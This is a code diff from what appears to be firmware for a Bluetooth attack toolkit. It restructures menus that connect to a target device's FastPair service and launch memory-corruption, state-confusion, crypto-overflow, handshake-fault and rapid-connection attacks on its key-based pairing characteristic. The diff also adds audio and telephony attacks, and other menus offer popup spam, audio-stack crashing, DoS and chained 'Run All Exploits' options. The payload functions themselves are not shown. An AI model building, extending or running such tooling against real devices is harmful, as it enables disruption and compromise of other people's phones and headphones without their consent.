@@ -23,26 +23,6 @@ std::vector<NimBLEClient*> BLEStateManager::activeClients;
 String BLEStateManager::currentDeviceName = "";
 
 //=============================================================================
-// FastPair Structs
-//=============================================================================
-
-struct FastPairModelInfo {
-    uint32_t modelId;
-    const char* name;
-    const char* deviceType;
-};
-
-struct FastPairDeviceInfo {
-    NimBLEAddress address;
-    String name;
-    int rssi;
-    bool supportsFastPair;
-    bool connected;
-    uint32_t modelId;
-    String deviceType;
-};
-
-//=============================================================================
 // FastPair Model Database
 //=============================================================================
 
@@ -3872,21 +3852,41 @@ void showFastPairSubMenu(NimBLEAddress target) {
         "Memory Corruption Attack",
         "State Confusion Attack",
         "Crypto Overflow Attack",
+        "Handshake Fault Attack",
+        "Rapid Connection Attack",
         "Popup Spam",
         "Run All Exploits"
     };
     
-    int choice = showSubMenu("FastPair Attacks", options, 6);
+    int choice = showSubMenu("FastPair Attacks", options, 8);
     if(choice == -1) return;
     
     FastPairExploitEngine fpEngine;
     
+    NimBLEClient* pClient = nullptr;
+    NimBLERemoteCharacteristic* pKbpChar = nullptr;
+    
+    if(choice <= 5 || choice == 7) {
+        String connectionMethod = "";
+        pClient = attemptConnectionWithStrategies(target, connectionMethod);
+        if(pClient) {
+            BLEStateManager::registerClient(pClient);
+            NimBLERemoteService* pService = pClient->getService(NimBLEUUID((uint16_t)0xFE2C));
+            if(pService) {
+                WhisperPairExploit whisper;
+                pKbpChar = whisper.findKBPCharacteristic(pService);
+            }
+        }
+    }
+    
     switch(choice) {
         case 0: fpEngine.testVulnerability(target); break;
-        case 1: fpEngine.exploitFastPairConnection(target, FP_EXPLOIT_MEMORY_CORRUPTION); break;
-        case 2: fpEngine.exploitFastPairConnection(target, FP_EXPLOIT_STATE_CONFUSION); break;
-        case 3: fpEngine.exploitFastPairConnection(target, FP_EXPLOIT_CRYPTO_OVERFLOW); break;
-        case 4: {
+        case 1: if(pKbpChar) fpEngine.executeMemoryCorruption(pKbpChar); break;
+        case 2: if(pKbpChar) fpEngine.executeStateConfusion(pKbpChar); break;
+        case 3: if(pKbpChar) fpEngine.executeCryptoOverflow(pKbpChar); break;
+        case 4: if(pKbpChar) fpEngine.executeHandshakeFault(pKbpChar); break;
+        case 5: if(pKbpChar) fpEngine.executeRapidConnection(target, pKbpChar); break;
+        case 6: {
             const char* popupOptions[] = {"Regular", "Fun", "Prank", "Custom"};
             int popupChoice = showSubMenu("Popup Type", popupOptions, 4);
             if(popupChoice != -1) {
@@ -3894,7 +3894,25 @@ void showFastPairSubMenu(NimBLEAddress target) {
             }
             break;
         }
-        case 5: fpEngine.exploitFastPairConnection(target, FP_EXPLOIT_ALL); break;
+        case 7:
+            if(pKbpChar) {
+                fpEngine.executeMemoryCorruption(pKbpChar);
+                delay(200);
+                fpEngine.executeStateConfusion(pKbpChar);
+                delay(200);
+                fpEngine.executeCryptoOverflow(pKbpChar);
+                delay(200);
+                fpEngine.executeHandshakeFault(pKbpChar);
+                delay(200);
+                fpEngine.executeRapidConnection(target, pKbpChar);
+            }
+            break;
+    }
+    
+    if(pClient) {
+        pClient->disconnect();
+        BLEStateManager::unregisterClient(pClient);
+        NimBLEDevice::deleteClient(pClient);
     }
 }
 
@@ -3922,13 +3940,12 @@ void showHFPSubMenu(NimBLEAddress target) {
 void showAudioSubMenu(NimBLEAddress target) {
     const char* options[] = {
         "AVRCP Media Control",
-        "A2DP Discovery Attack",
-        "A2DP Codec Overflow",
         "Audio Stack Crash",
+        "Telephony Alert Test",
         "Run All Audio Tests"
     };
     
-    int choice = showSubMenu("Audio Attacks", options, 5);
+    int choice = showSubMenu("Audio Attacks", options, 4);
     if(choice == -1) return;
     
     AudioAttackService audio;
@@ -3949,17 +3966,14 @@ void showAudioSubMenu(NimBLEAddress target) {
             break;
         }
         case 1:
-            showAttackProgress("A2DP discovery attack not implemented", TFT_YELLOW);
-            delay(1000);
-            break;
-        case 2:
-            showAttackProgress("A2DP codec attack not implemented", TFT_YELLOW);
-            delay(1000);
-            break;
-        case 3:
             audio.crashAudioStack(target);
             break;
-        case 4:
+        case 2: {
+            NimBLERemoteService* pService = pClient->getService(NimBLEUUID((uint16_t)0x1124));
+            if(pService) audio.attackTelephony(pService);
+            break;
+        }
+        case 3:
             audio.findAndAttackAudioServices(pClient);
             break;
     }
@@ -4024,15 +4038,18 @@ void showHIDSubMenu(NimBLEAddress target) {
 
 void showMemorySubMenu(NimBLEAddress target) {
     const char* options[] = {
-        "FastPair Crypto Overflow",
+        "FastPair Memory Corruption",
         "FastPair State Confusion",
-        "Test All Memory Attacks"
+        "FastPair Crypto Overflow",
+        "FastPair Handshake Fault",
+        "FastPair Rapid Connection",
+        "Run All FastPair Memory Attacks"
     };
     
-    int choice = showSubMenu("Memory Corruption", options, 3);
+    int choice = showSubMenu("Memory Corruption", options, 6);
     if(choice == -1) return;
     
-    WhisperPairExploit whisper;
+    FastPairExploitEngine fpEngine;
     
     NimBLEClient* pClient = nullptr;
     NimBLERemoteCharacteristic* pKbpChar = nullptr;
@@ -4042,26 +4059,44 @@ void showMemorySubMenu(NimBLEAddress target) {
     if(pClient) {
         BLEStateManager::registerClient(pClient);
         NimBLERemoteService* pService = pClient->getService(NimBLEUUID((uint16_t)0xFE2C));
-        if(pService) pKbpChar = whisper.findKBPCharacteristic(pService);
+        if(pService) {
+            WhisperPairExploit whisper;
+            pKbpChar = whisper.findKBPCharacteristic(pService);
+        }
+    }
+    
+    if(!pKbpChar) {
+        showAttackResult(false, "No FastPair service found");
+        if(pClient) {
+            pClient->disconnect();
+            BLEStateManager::unregisterClient(pClient);
+            NimBLEDevice::deleteClient(pClient);
+        }
+        return;
     }
     
     switch(choice) {
-        case 0: if(pKbpChar) whisper.sendCryptoOverflowAttack(pKbpChar); break;
-        case 1: if(pKbpChar) whisper.sendStateConfusionAttack(pKbpChar); break;
-        case 2:
-            if(pKbpChar) {
-                whisper.sendCryptoOverflowAttack(pKbpChar);
-                delay(200);
-                whisper.sendStateConfusionAttack(pKbpChar);
-            }
+        case 0: fpEngine.executeMemoryCorruption(pKbpChar); break;
+        case 1: fpEngine.executeStateConfusion(pKbpChar); break;
+        case 2: fpEngine.executeCryptoOverflow(pKbpChar); break;
+        case 3: fpEngine.executeHandshakeFault(pKbpChar); break;
+        case 4: fpEngine.executeRapidConnection(target, pKbpChar); break;
+        case 5:
+            fpEngine.executeMemoryCorruption(pKbpChar);
+            delay(200);
+            fpEngine.executeStateConfusion(pKbpChar);
+            delay(200);
+            fpEngine.executeCryptoOverflow(pKbpChar);
+            delay(200);
+            fpEngine.executeHandshakeFault(pKbpChar);
+            delay(200);
+            fpEngine.executeRapidConnection(target, pKbpChar);
             break;
     }
     
-    if(pClient) {
-        pClient->disconnect();
-        BLEStateManager::unregisterClient(pClient);
-        NimBLEDevice::deleteClient(pClient);
-    }
+    pClient->disconnect();
+    BLEStateManager::unregisterClient(pClient);
+    NimBLEDevice::deleteClient(pClient);
 }
 
 void showDoSSubMenu(NimBLEAddress target) {
@@ -4177,8 +4212,8 @@ void runUniversalAttack(NimBLEAddress target) {
     
     if(hasFastPair && (!hfpSuccess || !hidSuccess)) {
         showAttackProgress("Phase 3: Testing FastPair vulnerability...", TFT_BLUE);
-        WhisperPairExploit exploit;
-        fpSuccess = exploit.executeSilent(target);
+        FastPairExploitEngine fpEngine;
+        fpSuccess = fpEngine.testVulnerability(target);
         lines.push_back("FastPair Attack: " + String(fpSuccess ? "SUCCESS" : "FAILED"));
     }
     
@@ -4218,8 +4253,8 @@ void runQuickTest(NimBLEAddress target) {
         results.push_back("HFP: Not detected");
     }
     
-    WhisperPairExploit exploit;
-    bool fpVulnerable = exploit.executeSilent(target);
+    FastPairExploitEngine fpEngine;
+    bool fpVulnerable = fpEngine.testVulnerability(target);
     results.push_back("FastPair: " + String(fpVulnerable ? "VULNERABLE" : "SAFE"));
     
     std::vector<String> lines;
